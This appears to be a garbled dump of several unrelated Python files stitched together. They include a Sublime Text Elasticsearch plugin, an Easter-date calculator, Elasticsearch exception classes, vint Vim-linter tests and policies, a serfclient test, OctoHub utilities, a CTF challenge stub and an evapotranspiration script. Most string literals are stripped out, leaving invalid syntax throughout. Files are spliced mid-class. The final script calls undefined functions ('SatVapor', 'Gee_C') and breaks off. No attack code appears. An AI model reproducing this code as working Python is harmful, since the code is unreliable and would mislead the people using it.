~~~ return self . view . substr ( sublime . Region ( 0 , self . view . size ( ) ) ) \n 
\n 
~~ def init_client ( self ) : \n 
~~~ self . _client = Elasticsearch ( \n 
self . settings . base_url , \n 
send_get_body_as = , \n 
connection_class = CustomHeadersConnection , \n 
headers = self . settings . headers \n 
) \n 
return self . _client \n 
\n 
~~ def save_settings ( self ) : \n 
~~~ self . settings . save ( ) \n 
self . init_client ( ) \n 
\n 
~~ @ property \n 
def client ( self ) : \n 
~~~ return self . init_client ( ) \n 
\n 
~~ def track_command ( self ) : \n 
~~~ if self . settings . analytics : \n 
~~~ user_id = self . settings . user_id \n 
if not user_id : \n 
~~~ user_id = str ( uuid . uuid4 ( ) ) \n 
self . settings . set ( "user_id" , user_id ) \n 
self . settings . save ( ) \n 
track_activate ( user_id ) \n 
~~ track_command ( user_id , self . command_name ) \n 
\n 
~~ ~~ def show_input_panel ( self , label , default , callback ) : \n 
~~~ self . window . show_input_panel ( label , default , callback , None , None ) \n 
\n 
~~ def show_response ( self , response , title = "" ) : \n 
~~~ title = title or self . command_name \n 
text = json . dumps ( response , indent = 2 , ensure_ascii = False ) \n 
self . window . run_command ( \n 
"show_response" , { "title" : title , "text" : text } ) \n 
\n 
~~ def show_index_list_panel ( self , callback ) : \n 
~~~ list_panel = IndexListPanel ( \n 
self . window , self . client , self . settings . index ) \n 
list_panel . show ( callback ) \n 
\n 
~~ def show_doc_type_list_panel ( self , callback ) : \n 
~~~ list_panel = DocTypeListPanel ( \n 
self . window , self . client , self . settings . index ) \n 
list_panel . show ( callback ) \n 
\n 
~~ def show_analyzer_list_panel ( self , callback ) : \n 
~~~ list_panel = AnalyzerListPanel ( \n 
self . window , self . client , self . settings . index ) \n 
list_panel . show ( callback ) \n 
\n 
~~ def show_switch_server_list_panel ( self , callback ) : \n 
~~~ list_panel = SwitchServerListPanel ( self . window , self . settings . servers ) \n 
list_panel . show ( callback ) \n 
\n 
~~ def show_script_list_panel ( self , callback ) : \n 
~~~ list_panel = ScriptListPanel ( self . window , self . client ) \n 
list_panel . show ( callback ) \n 
\n 
~~ def show_search_template_list_panel ( self , callback ) : \n 
~~~ list_panel = SearchTemplateListPanel ( self . window , self . client ) \n 
list_panel . show ( callback ) \n 
\n 
~~ def show_alias_list_panel ( self , callback ) : \n 
~~~ list_panel = AliasListPanel ( \n 
self . window , self . client , self . settings . index ) \n 
list_panel . show ( callback ) \n 
\n 
~~ def show_index_template_list_panel ( self , callback ) : \n 
~~~ list_panel = IndexTemplateListPanel ( self . window , self . client ) \n 
list_panel . show ( callback ) \n 
\n 
~~ def show_warmer_list_panel ( self , callback ) : \n 
~~~ list_panel = WarmerListPanel ( \n 
self . window , self . client , self . settings . index ) \n 
list_panel . show ( callback ) \n 
\n 
~~ def show_field_list_panel ( self , callback ) : \n 
~~~ list_panel = FieldListPanel ( \n 
self . window , self . client , \n 
self . settings . index , self . settings . doc_type ) \n 
list_panel . show ( callback ) \n 
\n 
~~ def show_repository_list_panel ( self , callback ) : \n 
~~~ list_panel = RepositoryListPanel ( self . window , self . client ) \n 
list_panel . show ( callback ) \n 
\n 
~~ def show_snapshot_list_panel ( self , repository , callback ) : \n 
~~~ list_panel = SnapshotListPanel ( self . window , self . client , repository ) \n 
list_panel . show ( callback ) \n 
\n 
~~ def show_output_panel ( self , text , syntax = None ) : \n 
~~~ self . window . run_command ( \n 
"show_output_panel" , { "text" : text , "syntax" : syntax } ) \n 
\n 
~~ def show_object_output_panel ( self , obj ) : \n 
~~~ options = dict ( \n 
indent = 4 , \n 
ensure_ascii = False \n 
) \n 
\n 
self . show_output_panel ( \n 
json . dumps ( obj , ** options ) , \n 
syntax = "Packages/JavaScript/JSON.tmLanguage" ) \n 
\n 
~~ def show_active_server ( self ) : \n 
~~~ self . window . run_command ( "settings_show_active_server" ) \n 
\n 
~~ @ abstractmethod \n 
def run_request ( self , * args , ** kwargs ) : \n 
~~~ raise NotImplementedError ( ) \n 
\n 
~~ def run_request_wrapper ( self , * args , ** kwargs ) : \n 
~~~ try : \n 
~~~ response = self . run_request ( * args , ** kwargs ) \n 
~~ except Exception as e : \n 
~~~ sublime . error_message ( "Error: {}" . format ( e ) ) \n 
return \n 
\n 
~~ if response is not None : \n 
~~~ self . show_response ( response ) \n 
self . track_command ( ) \n 
\n 
~~ ~~ def request_thread ( self , * args , ** kwargs ) : \n 
~~~ thread = threading . Thread ( \n 
target = self . run_request_wrapper , args = args , kwargs = kwargs ) \n 
thread . start ( ) \n 
\n 
~~ def run ( self , * args , ** kwargs ) : \n 
~~~ self . request_thread ( * args , ** kwargs ) \n 
\n 
\n 
~~ ~~ class CreateBaseCommand ( BaseCommand ) : \n 
\n 
~~~ def run_request_wrapper ( self , * args , ** kwargs ) : \n 
~~~ try : \n 
~~~ response = self . run_request ( * args , ** kwargs ) \n 
~~ except Exception as e : \n 
~~~ sublime . error_message ( "Error: {}" . format ( e ) ) \n 
return \n 
\n 
~~ if response is not None : \n 
~~~ self . show_object_output_panel ( response ) \n 
self . track_command ( ) \n 
\n 
\n 
~~ ~~ ~~ class DeleteBaseCommand ( CreateBaseCommand ) : \n 
~~~ pass \n 
\n 
\n 
~~ class CatBaseCommand ( CreateBaseCommand ) : \n 
\n 
~~~ def is_enabled ( self ) : \n 
~~~ return True \n 
\n 
~~ def run_request_wrapper ( self , * args , ** kwargs ) : \n 
~~~ try : \n 
~~~ response = self . run_request ( * args , ** kwargs ) \n 
~~ except Exception as e : \n 
~~~ sublime . error_message ( "Error: {}" . format ( e ) ) \n 
return \n 
\n 
~~ if response is not None : \n 
~~~ self . show_output_panel ( response ) \n 
self . track_command ( ) \n 
\n 
\n 
~~ ~~ ~~ class SearchBaseCommand ( BaseCommand ) : \n 
\n 
~~~ def extend_options ( self , options , search_type = None ) : \n 
~~~ if search_type : \n 
~~~ self . command_name = "{base}-{search_type}" . format ( \n 
base = self . command_name , \n 
search_type = search_type . lower ( ) \n 
) \n 
\n 
~~ if search_type == "scan" : \n 
~~~ options [ "params" ] = dict ( \n 
search_type = search_type , \n 
scroll = self . settings . scroll_size \n 
) \n 
~~ elif search_type is not None : \n 
~~~ options [ "params" ] = dict ( \n 
search_type = search_type \n 
) \n 
~~ return options \n 
\n 
\n 
~~ ~~ class SettingsBaseCommand ( BaseCommand ) : \n 
\n 
~~~ def is_enabled ( self ) : \n 
~~~ return True \n 
~~ ~~ import sublime \n 
from . base import DeleteBaseCommand \n 
\n 
\n 
class DeleteDocumentCommand ( DeleteBaseCommand ) : \n 
~~~ command_name = "elasticsearch:delete-document" \n 
\n 
def is_enabled ( self ) : \n 
~~~ return True \n 
\n 
~~ def run_request ( self , id = None ) : \n 
~~~ if not id : \n 
~~~ self . show_input_panel ( , , self . run ) \n 
return \n 
\n 
~~ options = dict ( \n 
index = self . settings . index , \n 
doc_type = self . settings . doc_type , \n 
id = id \n 
) \n 
\n 
if sublime . ok_cancel_dialog ( "Are you sure you want to delete?" , ok_title = ) : \n 
~~~ return self . client . delete ( ** options ) \n 
~~ ~~ ~~ import sublime \n 
from . base import DeleteBaseCommand \n 
\n 
\n 
class IndicesDeleteAliasCommand ( DeleteBaseCommand ) : \n 
~~~ command_name = "elasticsearch:indices-delete-alias" \n 
\n 
def is_enabled ( self ) : \n 
~~~ return True \n 
\n 
~~ def run_request ( self , index = None , name = None ) : \n 
~~~ if not index or not name : \n 
~~~ self . show_alias_list_panel ( self . run ) \n 
return \n 
\n 
~~ options = dict ( \n 
index = index , \n 
name = name \n 
) \n 
\n 
if sublime . ok_cancel_dialog ( "Are you sure you want to delete?" , ok_title = ) : \n 
~~~ return self . client . indices . delete_alias ( ** options ) \n 
~~ ~~ ~~ from . base import BaseCommand \n 
\n 
\n 
class IndicesStatsCommand ( BaseCommand ) : \n 
~~~ command_name = "elasticsearch:indices-stats" \n 
\n 
def is_enabled ( self ) : \n 
~~~ return True \n 
\n 
~~ def run_request ( self , index = None ) : \n 
~~~ if index is None : \n 
~~~ self . show_index_list_panel ( self . run ) \n 
return \n 
\n 
~~ options = dict ( \n 
index = index , \n 
params = dict ( human = True ) \n 
) \n 
\n 
return self . client . indices . stats ( ** options ) \n 
~~ ~~ import sublime_plugin \n 
\n 
\n 
class ShowOutputPanelCommand ( sublime_plugin . WindowCommand ) : \n 
~~~ default_syntax = "Packages/Text/Plain text.tmLanguage" \n 
\n 
def run ( self , text , syntax = None ) : \n 
~~~ if syntax is None : \n 
~~~ syntax = self . default_syntax \n 
\n 
~~ panel = self . window . create_output_panel ( "elasticsearch" ) \n 
self . window . run_command ( \n 
"show_panel" , { "panel" : "output.elasticsearch" } ) \n 
panel . set_syntax_file ( syntax ) \n 
panel . settings ( ) . set ( , True ) \n 
panel . settings ( ) . set ( , False ) \n 
panel . set_read_only ( False ) \n 
panel . run_command ( , { : text } ) \n 
panel . set_read_only ( True ) \n 
# -*- coding: utf-8 -*- \n 
~~ ~~ """\nThis module offers a generic easter computing method for any given year, using\nWestern, Orthodox or Julian algorithms.\n""" \n 
\n 
import datetime \n 
\n 
__all__ = [ "easter" , "EASTER_JULIAN" , "EASTER_ORTHODOX" , "EASTER_WESTERN" ] \n 
\n 
EASTER_JULIAN = 1 \n 
EASTER_ORTHODOX = 2 \n 
EASTER_WESTERN = 3 \n 
\n 
\n 
def easter ( year , method = EASTER_WESTERN ) : \n 
~~~ """\n    This method was ported from the work done by GM Arts,\n    on top of the algorithm by Claus Tondering, which was\n    based in part on the algorithm of Ouding (1940), as\n    quoted in "Explanatory Supplement to the Astronomical\n    Almanac", P.  Kenneth Seidelmann, editor.\n\n    This algorithm implements three different easter\n    calculation methods:\n\n    1 - Original calculation in Julian calendar, valid in\n        dates after 326 AD\n    2 - Original method, with date converted to Gregorian\n        calendar, valid in years 1583 to 4099\n    3 - Revised method, in Gregorian calendar, valid in\n        years 1583 to 4099 as well\n\n    These methods are represented by the constants:\n\n    EASTER_JULIAN   = 1\n    EASTER_ORTHODOX = 2\n    EASTER_WESTERN  = 3\n\n    The default method is method 3.\n\n    More about the algorithm may be found at:\n\n    http://users.chariot.net.au/~gmarts/eastalg.htm\n\n    and\n\n    http://www.tondering.dk/claus/calendar.html\n\n    """ \n 
\n 
if not ( 1 <= method <= 3 ) : \n 
~~~ raise ValueError ( "invalid method" ) \n 
\n 
# g - Golden year - 1 \n 
# c - Century \n 
# h - (23 - Epact) mod 30 \n 
# i - Number of days from March 21 to Paschal Full Moon \n 
# j - Weekday for PFM (0=Sunday, etc) \n 
# p - Number of days from March 21 to Sunday on or before PFM \n 
#     (-6 to 28 methods 1 & 3, to 56 for method 2) \n 
# e - Extra days to add for method 2 (converting Julian \n 
#     date to Gregorian date) \n 
\n 
~~ y = year \n 
g = y % 19 \n 
e = 0 \n 
if method < 3 : \n 
# Old method \n 
~~~ i = ( 19 * g + 15 ) % 30 \n 
j = ( y + y // 4 + i ) % 7 \n 
if method == 2 : \n 
# Extra dates to convert Julian to Gregorian date \n 
~~~ e = 10 \n 
if y > 1600 : \n 
~~~ e = e + y // 100 - 16 - ( y // 100 - 16 ) // 4 \n 
~~ ~~ ~~ else : \n 
# New method \n 
~~~ c = y // 100 \n 
h = ( c - c // 4 - ( 8 * c + 13 ) // 25 + 19 * g + 15 ) % 30 \n 
i = h - ( h // 28 ) * ( 1 - ( h // 28 ) * ( 29 // ( h + 1 ) ) * ( ( 21 - g ) // 11 ) ) \n 
j = ( y + y // 4 + i + 2 - c + c // 4 ) % 7 \n 
\n 
# p can be from -6 to 56 corresponding to dates 22 March to 23 May \n 
# (later dates apply to method 2, although 23 May never actually occurs) \n 
~~ p = i - j + e \n 
d = 1 + ( p + 27 + ( p + 6 ) // 40 ) % 31 \n 
m = 3 + ( p + 26 ) // 30 \n 
return datetime . date ( int ( y ) , int ( m ) , int ( d ) ) \n 
~~ __all__ = [ \n 
, , , \n 
, , , , , \n 
, \n 
] \n 
\n 
class ImproperlyConfigured ( Exception ) : \n 
~~~ """\n    Exception raised when the config passed to the client is inconsistent or invalid.\n    """ \n 
\n 
\n 
~~ class ElasticsearchException ( Exception ) : \n 
~~~ """\n    Base class for all exceptions raised by this package\'s operations (doesn\'t\n    apply to :class:`~elasticsearch.ImproperlyConfigured`).\n    """ \n 
\n 
\n 
~~ class SerializationError ( ElasticsearchException ) : \n 
~~~ """\n    Data passed in failed to serialize properly in the ``Serializer`` being\n    used.\n    """ \n 
\n 
\n 
~~ class TransportError ( ElasticsearchException ) : \n 
~~~ """\n    Exception raised when ES returns a non-OK (>=400) HTTP status code. Or when\n    an actual connection error happens; in that case the ``status_code`` will\n    be set to ``\'N/A\'``.\n    """ \n 
@ property \n 
def status_code ( self ) : \n 
~~~ """\n        The HTTP status code of the response that precipitated the error or\n        ``\'N/A\'`` if not applicable.\n        """ \n 
return self . args [ 0 ] \n 
\n 
~~ @ property \n 
def error ( self ) : \n 
~~~ """ A string error message. """ \n 
return self . args [ 1 ] \n 
\n 
~~ @ property \n 
def info ( self ) : \n 
~~~ """ Dict of returned error info from ES, where available. """ \n 
return self . args [ 2 ] \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ return % ( self . status_code , self . error ) \n 
\n 
\n 
~~ ~~ class ConnectionError ( TransportError ) : \n 
~~~ """\n    Error raised when there was an exception while talking to ES. Original\n    exception from the underlying :class:`~elasticsearch.Connection`\n    implementation is available as ``.info.``\n    """ \n 
def __str__ ( self ) : \n 
~~~ return % ( \n 
self . error , self . info . __class__ . __name__ , self . info ) \n 
\n 
\n 
~~ ~~ class SSLError ( ConnectionError ) : \n 
~~~ """ Error raised when encountering SSL errors. """ \n 
\n 
\n 
~~ class ConnectionTimeout ( ConnectionError ) : \n 
~~~ """ A network timeout. Doesn\'t cause a node retry by default. """ \n 
def __str__ ( self ) : \n 
~~~ return % ( \n 
self . info . __class__ . __name__ , self . info ) \n 
\n 
\n 
~~ ~~ class NotFoundError ( TransportError ) : \n 
~~~ """ Exception representing a 404 status code. """ \n 
\n 
\n 
~~ class ConflictError ( TransportError ) : \n 
~~~ """ Exception representing a 409 status code. """ \n 
\n 
\n 
~~ class RequestError ( TransportError ) : \n 
~~~ """ Exception representing a 400 status code. """ \n 
\n 
\n 
~~ class AuthenticationException ( TransportError ) : \n 
~~~ """ Exception representing a 401 status code. """ \n 
\n 
\n 
~~ class AuthorizationException ( TransportError ) : \n 
~~~ """ Exception representing a 403 status code. """ \n 
\n 
# more generic mappings from status_code to python exceptions \n 
~~ HTTP_EXCEPTIONS = { \n 
400 : RequestError , \n 
401 : AuthenticationException , \n 
403 : AuthorizationException , \n 
404 : NotFoundError , \n 
409 : ConflictError , \n 
} \n 
from . alias_list_panel import AliasListPanel \n 
from . analyzer_list_panel import AnalyzerListPanel \n 
from . doc_type_list_panel import DocTypeListPanel \n 
from . field_list_panel import FieldListPanel \n 
from . index_list_panel import IndexListPanel \n 
from . index_template_list_panel import IndexTemplateListPanel \n 
from . repository_list_panel import RepositoryListPanel \n 
from . script_list_panel import ScriptListPanel \n 
from . search_template_list_panel import SearchTemplateListPanel \n 
from . snapshot_list_panel import SnapshotListPanel \n 
from . switch_server_list_panel import SwitchServerListPanel \n 
from . warmer_list_panel import WarmerListPanel \n 
\n 
__all__ = [ \n 
"AliasListPanel" , \n 
"AnalyzerListPanel" , \n 
"DocTypeListPanel" , \n 
"FieldListPanel" , \n 
"IndexListPanel" , \n 
"IndexTemplateListPanel" , \n 
"RepositoryListPanel" , \n 
"ScriptListPanel" , \n 
"SearchTemplateListPanel" , \n 
"SnapshotListPanel" , \n 
"SwitchServerListPanel" , \n 
"WarmerListPanel" , \n 
] \n 
import unittest \n 
from test . asserting . policy import PolicyAssertion , get_fixture_path \n 
\n 
from vint . linting . level import Level \n 
from vint . linting . policy . prohibit_command_with_unintended_side_effect import ProhibitCommandWithUnintendedSideEffect \n 
PATH_VALID_VIM_SCRIPT = get_fixture_path ( ) \n 
PATH_INVALID_VIM_SCRIPT = get_fixture_path ( \n 
\n 
class TestProhibitCommandWithUnintendedSideEffect ( PolicyAssertion , unittest . TestCase ) : \n 
~~~ def _create_violation_by_line_number ( self , line_number ) : \n 
~~~ return { \n 
: , \n 
: Level . WARNING , \n 
: { \n 
: line_number , \n 
: 1 , \n 
: PATH_INVALID_VIM_SCRIPT \n 
} \n 
} \n 
\n 
\n 
~~ def test_get_violation_if_found_with_valid_file ( self ) : \n 
~~~ self . assertFoundNoViolations ( PATH_VALID_VIM_SCRIPT , \n 
ProhibitCommandWithUnintendedSideEffect ) \n 
\n 
\n 
~~ def test_get_violation_if_found_with_invalid_file ( self ) : \n 
~~~ expected_violations = [ self . _create_violation_by_line_number ( line_number ) \n 
for line_number in range ( 1 , 14 ) ] \n 
\n 
# Offset range token length \n 
expected_violations [ 3 ] [ ] [ ] = 2 \n 
expected_violations [ 4 ] [ ] [ ] = 6 \n 
\n 
self . assertFoundViolationsEqual ( PATH_INVALID_VIM_SCRIPT , \n 
ProhibitCommandWithUnintendedSideEffect , \n 
expected_violations ) \n 
\n 
\n 
~~ ~~ if __name__ == : \n 
~~~ unittest . main ( ) \n 
~~ import unittest \n 
from test . asserting . config_source import ConfigSourceAssertion \n 
from test . asserting . config_source import get_fixture_path \n 
\n 
from vint . linting . config . config_file_source import ConfigFileSource \n 
from vint . linting . level import Level \n 
\n 
FIXTURE_CONFIG_FILE = get_fixture_path ( ) \n 
\n 
\n 
class TestConfigFileSource ( ConfigSourceAssertion , unittest . TestCase ) : \n 
~~~ class ConcreteConfigFileSource ( ConfigFileSource ) : \n 
~~~ def get_file_path ( self , env ) : \n 
~~~ return FIXTURE_CONFIG_FILE \n 
\n 
\n 
~~ ~~ def test_get_config_dict ( self ) : \n 
~~~ expected_config_dict = { \n 
: { \n 
: True , \n 
: Level . WARNING , \n 
: 10 , \n 
} , \n 
: { \n 
: { \n 
: False , \n 
} , \n 
: { \n 
: True , \n 
} , \n 
} \n 
} \n 
\n 
config_source = self . initialize_config_source_with_env ( \n 
TestConfigFileSource . ConcreteConfigFileSource ) \n 
self . assertConfigDict ( config_source , expected_config_dict ) \n 
\n 
\n 
~~ ~~ if __name__ == : \n 
~~~ unittest . main ( ) \n 
~~ from vint . ast . plugin . scope_plugin . scope_detector import ( \n 
detect_scope_visibility , \n 
normalize_variable_name , \n 
is_builtin_variable , \n 
) \n 
from vint . ast . plugin . scope_plugin . scope_linker import ScopeLinker \n 
from vint . ast . plugin . scope_plugin . identifier_classifier import ( \n 
IdentifierClassifier , \n 
is_function_identifier , \n 
) \n 
\n 
\n 
REACHABILITY_FLAG = \n 
REFERECED_FLAG = \n 
\n 
\n 
class ReferenceReachabilityTester ( object ) : \n 
~~~ """ A class for tester for reference reachabilities. """ \n 
\n 
class TwoWayScopeReferenceAttacher ( object ) : \n 
~~~ """ A class for AST processor to do attach to way reference between\n        a parent scope and the child scopes.\n        """ \n 
\n 
@ classmethod \n 
def attach ( cls , root_scope_tree ) : \n 
~~~ root_scope_tree [ ] = None \n 
\n 
return cls . _attach_recursively ( root_scope_tree ) \n 
\n 
\n 
~~ @ classmethod \n 
def _attach_recursively ( cls , scope_tree ) : \n 
~~~ for child_scope in scope_tree [ ] : \n 
~~~ child_scope [ ] = scope_tree \n 
cls . _attach_recursively ( child_scope ) \n 
\n 
~~ return scope_tree \n 
\n 
\n 
~~ ~~ def process ( self , ast ) : \n 
~~~ scope_linker = ScopeLinker ( ) \n 
scope_linker . process ( ast ) \n 
\n 
id_collector = IdentifierClassifier . IdentifierCollector ( ) \n 
classified_id_group = id_collector . collect_identifiers ( ast ) \n 
dec_id_nodes = classified_id_group [ ] \n 
ref_id_nodes = classified_id_group [ ] \n 
\n 
self . _scope_tree = scope_linker . scope_tree \n 
self . _link_registry = scope_linker . link_registry \n 
\n 
# Attach a parent_scope accessor to the scope tree \n 
ReferenceReachabilityTester . TwoWayScopeReferenceAttacher . attach ( self . _scope_tree ) \n 
\n 
# Reset REFERECED_FLAG to False \n 
for dec_id_node in dec_id_nodes : \n 
~~~ dec_id_node [ REFERECED_FLAG ] = False \n 
\n 
~~ for ref_id_node in ref_id_nodes : \n 
~~~ is_reachable = self . check_reachability ( ref_id_node ) \n 
ref_id_node [ REACHABILITY_FLAG ] = is_reachable \n 
\n 
\n 
~~ ~~ def get_objective_scope_visibility ( self , node ) : \n 
~~~ """ Returns a objective scope visibility. """ \n 
context_scope = self . _link_registry . get_scope_by_referencing_identifier ( node ) \n 
return detect_scope_visibility ( node , context_scope ) [ ] \n 
\n 
\n 
~~ def _reset_referenced_flag ( self , scope_tree ) : \n 
~~~ for child_scope in scope_tree [ ] : \n 
~~~ for functions in child_scope [ ] . values ( ) : \n 
~~~ for function in functions : \n 
~~~ function [ REFERECED_FLAG ] = False \n 
\n 
~~ ~~ for variables in child_scope [ ] . values ( ) : \n 
~~~ for variable in variables : \n 
~~~ variable [ REFERECED_FLAG ] = False \n 
\n 
~~ ~~ self . _reset_referenced_flag ( child_scope ) \n 
\n 
\n 
~~ ~~ def check_reachability ( self , ref_id_node ) : \n 
~~~ scope = self . _link_registry . get_context_scope_by_identifier ( ref_id_node ) \n 
var_name = normalize_variable_name ( ref_id_node , scope ) \n 
is_func_id = is_function_identifier ( ref_id_node ) \n 
\n 
while scope is not None : \n 
~~~ if is_func_id : \n 
~~~ functions_list = scope [ ] \n 
if var_name in functions_list : \n 
# The function is found in the symbol table for functions. \n 
~~~ for variable in functions_list [ var_name ] : \n 
~~~ declaring_id_node = self . _link_registry . get_declarative_identifier_by_variable ( variable ) \n 
declaring_id_node [ REFERECED_FLAG ] = True \n 
\n 
~~ return True \n 
~~ else : \n 
# We can access the function via a variable function \n 
# reference if the function not found from the symbol table \n 
# for functions. So we should check the symbol table for \n 
# variables to search the function reference. \n 
~~~ pass \n 
\n 
~~ ~~ variables_list = scope [ ] \n 
if var_name in variables_list : \n 
# The variable or function reference found in the symbol table \n 
# for variables. \n 
~~~ for variable in variables_list [ var_name ] : \n 
~~~ declaring_id_node = self . _link_registry . get_declarative_identifier_by_variable ( variable ) \n 
declaring_id_node [ REFERECED_FLAG ] = True \n 
\n 
~~ return True \n 
\n 
~~ scope = scope [ ] \n 
\n 
# If it is builtin, it will be used by Vim. \n 
~~ return is_builtin_variable ( ref_id_node ) \n 
\n 
\n 
~~ ~~ def is_reference_identifier ( node ) : \n 
~~~ return REACHABILITY_FLAG in node \n 
\n 
\n 
~~ def is_reachable_reference_identifier ( node ) : \n 
~~~ return node . get ( REACHABILITY_FLAG , False ) \n 
\n 
\n 
~~ def is_declarative_identifier ( node ) : \n 
~~~ return REFERECED_FLAG in node \n 
\n 
\n 
~~ def is_referenced_declarative_identifier ( node ) : \n 
~~~ return node . get ( REFERECED_FLAG , False ) \n 
~~ import re \n 
from vint . ast . node_type import NodeType \n 
from vint . linting . level import Level \n 
from vint . linting . policy . abstract_policy import AbstractPolicy \n 
from vint . linting . policy_registry import register_policy \n 
from vint . ast . dictionary . abbreviations import ( \n 
Abbreviations , \n 
AbbreviationsIncludingInvertPrefix , \n 
) \n 
\n 
\n 
SetCommandFamily = { \n 
: True , \n 
: True , \n 
: True , \n 
} \n 
\n 
\n 
@ register_policy \n 
class ProhibitAbbreviationOption ( AbstractPolicy ) : \n 
~~~ def __init__ ( self ) : \n 
~~~ super ( ProhibitAbbreviationOption , self ) . __init__ ( ) \n 
self . description = \n 
self . reference = \n 
self . level = Level . STYLE_PROBLEM \n 
\n 
self . was_scriptencoding_found = False \n 
self . has_encoding_opt_after_scriptencoding = False \n 
\n 
\n 
~~ def listen_node_types ( self ) : \n 
~~~ return [ NodeType . EXCMD , NodeType . OPTION ] \n 
\n 
\n 
~~ def is_valid ( self , node , lint_context ) : \n 
~~~ """ Whether the specified node is valid.\n\n        Abbreviation options are invalid.\n        """ \n 
\n 
node_type = NodeType ( node [ ] ) \n 
\n 
if node_type is NodeType . OPTION : \n 
# Remove & at head \n 
~~~ option_name = node [ ] [ 1 : ] \n 
is_valid = option_name not in Abbreviations \n 
\n 
if not is_valid : \n 
~~~ self . _make_description_by_option_name ( option_name ) \n 
\n 
~~ return is_valid \n 
\n 
~~ excmd_node = node \n 
is_set_cmd = excmd_node [ ] [ ] . get ( ) in SetCommandFamily \n 
\n 
if not is_set_cmd : \n 
~~~ return True \n 
\n 
~~ option_expr = excmd_node [ ] . split ( ) [ 1 ] \n 
# Care `:set ft=vim` and `:set cpo&vim`, ... \n 
option_name = re . match ( , option_expr ) . group ( 0 ) \n 
\n 
# After a "set" command, we can add an invert prefix "no" and "inv" \n 
# to options. For example, "nowrap" is an inverted option "wrap". \n 
is_valid = option_name not in AbbreviationsIncludingInvertPrefix \n 
\n 
if not is_valid : \n 
~~~ self . _make_description_by_option_name ( option_name ) \n 
\n 
~~ return is_valid \n 
\n 
\n 
~~ def _make_description_by_option_name ( self , option_name ) : \n 
~~~ param = { \n 
: AbbreviationsIncludingInvertPrefix [ option_name ] , \n 
: option_name , \n 
} \n 
\n 
self . description = ( \n 
. format ( ** param ) ) \n 
~~ ~~ from serfclient import result \n 
\n 
\n 
class TestSerfResult ( object ) : \n 
~~~ def test_initialises_to_none ( self ) : \n 
~~~ r = result . SerfResult ( ) \n 
assert r . head is None \n 
assert r . body is None \n 
\n 
~~ def test_provides_a_pretty_printed_form_for_repl_use ( self ) : \n 
~~~ r = result . SerfResult ( head = { "a" : 1 } , body = ( , ) ) \n 
assert str ( r ) == "SerfResult<head={\'a\': 1},body=(\'foo\', \'bar\')>" \n 
\n 
~~ def test_can_convert_to_list ( self ) : \n 
~~~ r = result . SerfResult ( head = 1 , body = 2 ) \n 
assert sorted ( list ( r ) ) == [ 1 , 2 ] \n 
\n 
~~ def test_can_convert_to_tuple ( self ) : \n 
~~~ r = result . SerfResult ( head = 1 , body = 2 ) \n 
assert sorted ( tuple ( r ) ) == [ 1 , 2 ] \n 
# Copyright (c) 2013 Alon Swartz <alon@turnkeylinux.org> \n 
# \n 
# This file is part of OctoHub. \n 
# \n 
# OctoHub is free software; you can redistribute it and/or modify it under the \n 
# terms of the GNU General Public License as published by the Free Software \n 
# Foundation; either version 3 of the License, or (at your option) any later \n 
# version. \n 
\n 
~~ ~~ import os \n 
import logging \n 
\n 
class AttrDict ( dict ) : \n 
~~~ """Attribute Dictionary (set and access attributes \'pythonically\')""" \n 
def __getattr__ ( self , name ) : \n 
~~~ if name in self : \n 
~~~ return self [ name ] \n 
~~ raise AttributeError ( % name ) \n 
\n 
~~ def __setattr__ ( self , name , val ) : \n 
~~~ self [ name ] = val \n 
\n 
~~ ~~ def get_logger ( name , level = None ) : \n 
~~~ """Returns logging handler based on name and level (stderr)\n        name (str): name of logging handler\n        level (str): see logging.LEVEL\n    """ \n 
logger = logging . getLogger ( name ) \n 
\n 
if not logger . handlers : \n 
~~~ stderr = logging . StreamHandler ( ) \n 
stderr . setFormatter ( logging . Formatter ( \n 
) ) \n 
logger . addHandler ( stderr ) \n 
\n 
level = level if level else os . environ . get ( , ) \n 
logger . setLevel ( getattr ( logging , level ) ) \n 
\n 
~~ return logger \n 
\n 
~~ from hacksport . problem import Challenge \n 
\n 
class Problem ( Challenge ) : \n 
~~~ def setup ( self ) : \n 
~~~ self . flag = \n 
# -*- coding: utf-8 -*- \n 
~~ ~~ """\nSpyder Editor\n\nThis is a temporary script file.\n""" \n 
\n 
from math import * \n 
\n 
def AirDensity ( RH , Tc , P = 101.2 ) : \n 
~~~ Rd = 286.9 # Specific gas constant of dry air in J/(kg*K)     \n 
q = 0.622 * ( RH * SatVapor ( Tc ) ) / P # Mixing ratio in kg/kg \n 
Tv = ( Tc + 273.15 ) * ( 1.0 + 0.61 * q ) # Compute virtual temperature in K \n 
P *= 1000.0 # Convert pressure from kPa to Pa (= Nm/m^3 = J/m^3) \n 
rho_a = P / ( Rd * Tv ) # Compute air density in kg/ \n 
return rho_a \n 
\n 
~~ def PsychConst ( P , cP = 1.013 , lambda_v = 2.26e3 ) : \n 
~~~ gamma = ( cP * P / ( 0.622 * lambda_v ) ) \n 
return gamma \n 
\n 
~~ def SatVaporPress ( Tc ) : \n 
~~~ eSat = 0.61 * exp ( 17.27 * Tc / ( 237.3 + Tc ) ) \n 
return eSat \n 
\n 
~~ def SlopeSatVaporPress ( Tc ) : \n 
~~~ delta = 4098.0 * SatVaporPress ( Tc ) / ( 237.3 + Tc ) ** 2 \n 
return delta \n 
\n 
~~ def AeroReist ( um , zm , z0 , d , zmp = zm ) : \n 
~~~ k = 0.4 \n 
r_a = 1.0 / ( k ** 2 * um ) * log ( ( zm - d ) / z0 ) * log ( ( zmp - d ) / ( z0 / 10.0 ) ) \n 
return r_a \n 
\n 
~~ def SurfResist ( g0 , S , D , Tc , SM , SM0 ) : \n 
~~~ g_c = Gee_C ( ) \n 
g_R = Gee_R ( S ) \n 
g_D = Gee_D ( D ) \n 
g_T = Gee_T ( Tc + 273.15 ) \n 
g_M = Gee_M ( SM , SM0 ) \n 
g_s = g0 * g_c * g_R * g_D * g_T * g_M \n 
r_s = 1.0 / g_s \n 
return r_s \n 
\n 
~~ def Gee_c ( ) : \n 
~~~ g_c = 1.0 \n 
return g_c \n 
\n 
~~ def Gee_R ( S , K_R = 200.0 ) : \n 
~~~ g_R = ( S * ( 1000.0 + K_R ) ) / ( 1000.0 * ( S + K_R ) ) \n 
return g_R \n 
\n 
~~ def Gee_D ( D , K_D1 = - 0.307 , K_D2 = 0.019 ) : \n 
~~~ g_D = 1.0 + K_D1 * D + K_D2 * D ** 2 \n 
return g_D \n 
\n 
~~ def Gee_T ( TK , TL = 273.0 , TH = 313.0 , T0 = 293.0 ) : \n 
~~~ alpha_T = ( TH - T0 ) / ( T0 - TL ) \n 
